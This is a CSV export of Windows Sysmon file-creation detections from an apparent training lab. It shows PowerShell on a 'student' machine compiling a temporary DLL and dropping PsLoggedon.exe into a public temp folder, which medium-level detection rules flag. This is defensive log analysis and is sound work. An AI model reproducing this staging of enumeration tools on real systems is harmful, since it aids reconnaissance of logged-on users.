"Timestamp","RuleTitle","Level","Computer","Channel","EventID","MitreTactics","MitreTags","OtherTags","RecordID","Details","ExtraFieldInfo","RuleFile","RuleID","EvtxFile"
"2025-12-23 14:23:21.572 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172720,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_nqgm45da.amr.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7612 ¦ PGUID: E9F06A57-97C9-694A-E902-000000002300","CreationUtcTime: 2025-12-23 13:23:21.568 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:23:21.568","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:03.280 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172722,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_do5nk2ih.xvj.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2188 ¦ PGUID: E9F06A57-97F3-694A-EA02-000000002300","CreationUtcTime: 2025-12-23 13:24:03.274 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:24:03.274","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:24:52.348 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172725,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_fcmzmwvp.g1w.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3748 ¦ PGUID: E9F06A57-9824-694A-EC02-000000002300","CreationUtcTime: 2025-12-23 13:24:52.335 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:24:52.335","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:25:56.566 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172728,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_rdcdecrz.nlq.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3660 ¦ PGUID: E9F06A57-9864-694A-EE02-000000002300","CreationUtcTime: 2025-12-23 13:25:56.555 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:25:56.555","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.408 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172730,"Path: C:\Users\student\AppData\Local\Temp\__PSScriptPolicyTest_xgwv1cg1.3p0.ps1 ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:32.396 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:32.398","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.741 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172732,"Path: C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.cmdline ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:32.741 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:32.741","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:39.216 +01:00","File Created","info","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172762,"Path: C:\Users\Public\temp\Pstools.chm ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:39.214 ¦ RuleName: - ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:39.216","Sysmon_11_Info_FileCreated.yml","8a76bcd8-dec2-4c8a-995d-a4600aad8fe2","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.740 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172731,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.dll ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:32.739 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:32.739","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:32.920 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172735,"Rule: DLL ¦ Path: C:\Users\student\AppData\Local\Temp\5wmkblvr\5wmkblvr.dll ¦ Proc: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ¦ PID: 3464 ¦ PGUID: E9F06A57-9888-694A-F002-000000002300","CreationUtcTime: 2025-12-23 13:26:32.739 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:32.919","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
"2025-12-23 14:26:38.677 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",172736,"Rule: EXE ¦ Path: C:\Users\Public\temp\PsLoggedon.exe ¦ Proc: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 2592 ¦ PGUID: E9F06A57-9888-694A-EF02-000000002300","CreationUtcTime: 2025-12-23 13:26:38.675 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-23 13:26:38.677","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\mc_enum.evtx"
